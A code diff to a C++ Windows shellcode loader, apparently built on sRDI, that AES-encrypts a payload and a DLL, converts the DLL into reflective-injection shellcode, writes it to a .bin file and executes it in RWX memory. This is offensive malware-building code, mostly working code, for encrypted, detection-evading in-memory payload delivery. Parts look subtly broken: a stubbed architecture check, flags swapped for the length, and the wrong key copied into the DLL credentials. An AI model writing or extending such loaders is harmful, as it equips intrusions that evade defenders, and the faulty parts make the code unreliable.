@@ -7,6 +7,8 @@
 #include <Windows.h>
 #include <bcrypt.h>
 #include <functional>
+#include <iosfwd>
+#include <fstream>
 
 #include "Dll.h"
 #include "Payload.h"
@@ -59,12 +61,15 @@ FARPROC GetProcAddressR(HMODULE hModule, LPCSTR lpProcName)
 	return nullptr;
 }
 
+// Todo: fix
+// Check unencrypted dll instead of crypted dll
 BOOL Is64BitDLL(UINT_PTR uiLibraryAddress)
 {
-	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew);
+	//PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew);
 
-	if (pNtHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) return true;
-	else return false;
+	//if (pNtHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) return true;
+	//else return false;
+	return false;
 }
 
 DWORD GetFileContents(LPCSTR filename, LPSTR* data, DWORD& size)
@@ -98,7 +103,7 @@ DWORD HashFunctionName(LPSTR name) {
 	return hash;
 }
 
-BOOL ConvertToShellcode(LPVOID inBytes, DWORD length, DWORD userFunction, LPVOID userData, DWORD userLength, DWORD flags, LPSTR& outBytes, DWORD& outLength)
+BOOL ConvertToShellcode(LPVOID inBytes, DWORD length, DWORD userFunction, LPVOID userData, DWORD userLength, LPSTR& outBytes, DWORD& outLength)
 {
 
 	LPSTR rdiShellcode = nullptr;
@@ -199,8 +204,8 @@ BOOL ConvertToShellcode(LPVOID inBytes, DWORD length, DWORD userFunction, LPVOID
 		bootstrap[i++] = 0x44;
 		bootstrap[i++] = 0x24;
 		bootstrap[i++] = 4 * 8;
-		MoveMemory(bootstrap + i, &flags, sizeof(flags));
-		i += sizeof(flags);
+		MoveMemory(bootstrap + i, &length, sizeof(length));
+		i += sizeof(length);
 
 		// call - Transfer execution to the RDI
 		bootstrap[i++] = 0xe8;
@@ -281,8 +286,8 @@ BOOL ConvertToShellcode(LPVOID inBytes, DWORD length, DWORD userFunction, LPVOID
 
 		// push <Flags>
 		bootstrap[i++] = 0x68;
-		MoveMemory(bootstrap + i, &flags, sizeof(flags));
-		i += sizeof(flags);
+		MoveMemory(bootstrap + i, &length, sizeof(length));
+		i += sizeof(length);
 
 		// push <Length of User Data>
 		bootstrap[i++] = 0x68;
@@ -341,6 +346,7 @@ typedef BOOL	 (__cdecl* EXPORTEDFUNCTION)(LPVOID, DWORD);
 #define NT_SUCCESS(Status)          (((NTSTATUS)(Status)) >= 0)
 #define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001L)
 
+// todo: encrypt dll buffer an prefixing with key and iv
 void main()
 {
 	LPSTR					finalShellcode = nullptr;
@@ -349,18 +355,24 @@ void main()
 	BCRYPT_ALG_HANDLE       hAesAlg = NULL;
 	BCRYPT_KEY_HANDLE       hKey = NULL;
 	NTSTATUS                status = STATUS_UNSUCCESSFUL;
-	DWORD                   cbCipherText = 0,
-							cbRawData = 0,
+	DWORD                   cbCipherPayload = 0,
+							cbRawPayload = 0,
+							cbRawDll = 0,
+							cbCipherDll = 0,
 							cbData = 0,
 							cbKeyObject = 0,
 							cbBlockLen = 0,
 							finalSize;
-	PBYTE                   pbCipherText = NULL,
-							pbRawData = NULL,
+	PBYTE					pbCipherDll = NULL,
+							pbRawDll = NULL,
+							pbCipherPayload = NULL,
+							pbRawPayload = NULL,
 							pbKeyObject = NULL,
 							pbIV = NULL;
-	BYTE                    creds[32] = {};
-
+	BYTE                    creds[32] = {},
+							dllCreds[32] = {};
+	std::fstream			outFile;
+	
 	// Open an algorithm handle.
 	if (!NT_SUCCESS(status = BCryptOpenAlgorithmProvider(
 		&hAesAlg,
@@ -372,6 +384,10 @@ void main()
 		goto Cleanup;
 	}
 
+	///
+	// Encrypt payload
+	///
+	
 	// Calculate the size of the buffer to hold the KeyObject.
 	if (!NT_SUCCESS(status = BCryptGetProperty(
 		hAesAlg,
@@ -449,37 +465,37 @@ void main()
 		goto Cleanup;
 	}
 
-	cbRawData = sizeof(rgbRawData);
-	pbRawData = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbRawData);
-	if (NULL == pbRawData)
+	cbRawPayload = sizeof(rgbRawPayload);
+	pbRawPayload = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbRawPayload);
+	if (NULL == pbRawPayload)
 	{
 		wprintf(L"**** memory allocation failed\n");
 		goto Cleanup;
 	}
 
-	memcpy(pbRawData, rgbRawData, sizeof(rgbRawData));
+	memcpy(pbRawPayload, rgbRawPayload, sizeof(rgbRawPayload));
 
 	//
 	// Get the output buffer size.
 	//
 	if (!NT_SUCCESS(status = BCryptEncrypt(
 		hKey,
-		pbRawData,
-		cbRawData,
+		pbRawPayload,
+		cbRawPayload,
 		NULL,
 		pbIV,
 		cbBlockLen,
 		NULL,
 		0,
-		&cbCipherText,
+		&cbCipherPayload,
 		BCRYPT_BLOCK_PADDING)))
 	{
 		wprintf(L"**** Error 0x%x returned by BCryptEncrypt\n", status);
 		goto Cleanup;
 	}
 
-	pbCipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbCipherText + 32);
-	if (NULL == pbCipherText)
+	pbCipherPayload = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbCipherPayload + 32);
+	if (NULL == pbCipherPayload)
 	{
 		wprintf(L"**** memory allocation failed\n");
 		goto Cleanup;
@@ -489,13 +505,13 @@ void main()
 	// For block sized messages, block padding will add an extra block.
 	if (!NT_SUCCESS(status = BCryptEncrypt(
 		hKey,
-		pbRawData,
-		cbRawData,
+		pbRawPayload,
+		cbRawPayload,
 		NULL,
 		pbIV,
 		cbBlockLen,
-		pbCipherText,
-		cbCipherText,
+		pbCipherPayload,
+		cbCipherPayload,
 		&cbData,
 		BCRYPT_BLOCK_PADDING)))
 	{
@@ -508,18 +524,173 @@ void main()
 	std::copy_n(rgbIV, 16, creds + 16);
 
 	// Append creds to cipher text
-	memcpy(&pbCipherText[cbCipherText], creds, sizeof(creds));
+	memcpy(&pbCipherPayload[cbCipherPayload], creds, sizeof(creds));
 
-	if (rawData[0] == 'M' && rawData[1] == 'Z') {
+	///
+	// Encrypt Dll
+	///
+
+	HeapFree(GetProcessHeap(), 0, pbKeyObject);
+	HeapFree(GetProcessHeap(), 0, pbIV);
+	
+	cbData = 0;
+	cbKeyObject = 0;
+	cbBlockLen = 0;
+	pbKeyObject = NULL;
+	pbIV = NULL;
+	hKey = NULL;
+	
+	// Calculate the size of the buffer to hold the KeyObject.
+	if (!NT_SUCCESS(status = BCryptGetProperty(
+		hAesAlg,
+		BCRYPT_OBJECT_LENGTH,
+		(PBYTE)&cbKeyObject,
+		sizeof(DWORD),
+		&cbData,
+		0)))
+	{
+		wprintf(L"**** Error 0x%x returned by BCryptGetProperty\n", status);
+		goto Cleanup;
+	}
+
+	// Allocate the key object on the heap.
+	pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
+	if (NULL == pbKeyObject)
+	{
+		wprintf(L"**** memory allocation failed\n");
+		goto Cleanup;
+	}
+
+	// Calculate the block length for the IV.
+	if (!NT_SUCCESS(status = BCryptGetProperty(
+		hAesAlg,
+		BCRYPT_BLOCK_LENGTH,
+		(PBYTE)&cbBlockLen,
+		sizeof(DWORD),
+		&cbData,
+		0)))
+	{
+		wprintf(L"**** Error 0x%x returned by BCryptGetProperty\n", status);
+		goto Cleanup;
+	}
+
+	// Determine whether the cbBlockLen is not longer than the IV length.
+	if (cbBlockLen > sizeof(rgbDllIV))
+	{
+		wprintf(L"**** block length is longer than the provided IV length\n");
+		goto Cleanup;
+	}
+
+	// Allocate a buffer for the IV. The buffer is consumed during the 
+	// encrypt/decrypt process.
+	pbIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbBlockLen);
+	if (NULL == pbIV)
+	{
+		wprintf(L"**** memory allocation failed\n");
+		goto Cleanup;
+	}
+
+	memcpy(pbIV, rgbDllIV, cbBlockLen);
+
+	if (!NT_SUCCESS(status = BCryptSetProperty(
+		hAesAlg,
+		BCRYPT_CHAINING_MODE,
+		(PBYTE)BCRYPT_CHAIN_MODE_CBC,
+		sizeof(BCRYPT_CHAIN_MODE_CBC),
+		0)))
+	{
+		wprintf(L"**** Error 0x%x returned by BCryptSetProperty\n", status);
+		goto Cleanup;
+	}
+
+	// Generate the key from supplied input key bytes.
+	if (!NT_SUCCESS(status = BCryptGenerateSymmetricKey(
+		hAesAlg,
+		&hKey,
+		pbKeyObject,
+		cbKeyObject,
+		(PBYTE)rgbDllAES128Key,
+		sizeof(rgbDllAES128Key),
+		0)))
+	{
+		wprintf(L"**** Error 0x%x returned by BCryptGenerateSymmetricKey\n", status);
+		goto Cleanup;
+	}
+
+	cbRawDll = sizeof(rgbRawDll);
+	pbRawDll = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbRawDll);
+	if (NULL == pbRawDll)
+	{
+		wprintf(L"**** memory allocation failed\n");
+		goto Cleanup;
+	}
+
+	memcpy(pbRawDll, rgbRawDll, sizeof(rgbRawDll));
+
+	//
+	// Get the output buffer size.
+	//
+	if (!NT_SUCCESS(status = BCryptEncrypt(
+		hKey,
+		pbRawDll,
+		cbRawDll,
+		NULL,
+		pbIV,
+		cbBlockLen,
+		NULL,
+		0,
+		&cbCipherDll,
+		BCRYPT_BLOCK_PADDING)))
+	{
+		wprintf(L"**** Error 0x%x returned by BCryptEncrypt\n", status);
+		goto Cleanup;
+	}
+
+	pbCipherDll = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbCipherDll + 32);
+	if (NULL == pbCipherDll)
+	{
+		wprintf(L"**** memory allocation failed\n");
+		goto Cleanup;
+	}
+
+	// Copy key and iv to creds buffer
+	std::copy_n(rgbAES128Key, 16, dllCreds);
+	std::copy_n(rgbIV, 16, dllCreds + 16);
+
+	// Prefix cipher text with creds
+	memcpy(pbCipherDll, dllCreds, sizeof(dllCreds));
+
+	// Use the key to encrypt the plaintext buffer.
+	// For block sized messages, block padding will add an extra block.
+	if (!NT_SUCCESS(status = BCryptEncrypt(
+		hKey,
+		pbRawDll,
+		cbRawDll,
+		NULL,
+		pbIV,
+		cbBlockLen,
+		&pbCipherDll[32],
+		cbCipherDll + 32,
+		&cbData,
+		BCRYPT_BLOCK_PADDING)))
+	{
+		wprintf(L"**** Error 0x%x returned by BCryptEncrypt\n", status);
+		goto Cleanup;
+	}
+
+	///
+	// Create shellcode
+	///
+	
+	if (rgbRawDll[0] == 'M' && rgbRawDll[1] == 'Z') {
 		printf("[+] File is a DLL, attempting to convert\n");
 
 		if (!ConvertToShellcode(
-			rawData, 
-			sizeof(rawData), 
+			pbCipherDll,
+			cbCipherDll + 32,
 			HashFunctionName((LPSTR)"Run"), 
-			pbCipherText, 
-			cbCipherText + 32, 
-			SRDI_CLEARHEADER, 
+			pbCipherPayload, 
+			cbCipherPayload + 32, 
 			finalShellcode, 
 			finalSize
 		)) 
@@ -534,6 +705,15 @@ void main()
 		goto Cleanup;
 	}
 
+	outFile = std::fstream(R"(C:\Users\Philip\source\repos\BeakeyBoi\bin\FinalShellcodeRDI_x86.bin)", 
+		std::ios::out | std::ios::binary);
+	outFile.write(finalShellcode, finalSize);
+	outFile.close();
+
+	///
+	// Execute shellcode
+	///
+	
 	GetNativeSystemInfo(&sysInfo);
 
 	// Only set the first page to RWX
@@ -565,14 +745,14 @@ Cleanup:
 		BCryptDestroyKey(hKey);
 	}
 
-	if (pbCipherText)
+	if (pbCipherPayload)
 	{
-		HeapFree(GetProcessHeap(), 0, pbCipherText);
+		HeapFree(GetProcessHeap(), 0, pbCipherPayload);
 	}
 
-	if (pbRawData)
+	if (pbRawPayload)
 	{
-		HeapFree(GetProcessHeap(), 0, pbRawData);
+		HeapFree(GetProcessHeap(), 0, pbRawPayload);
 	}
 
 	if (pbKeyObject)
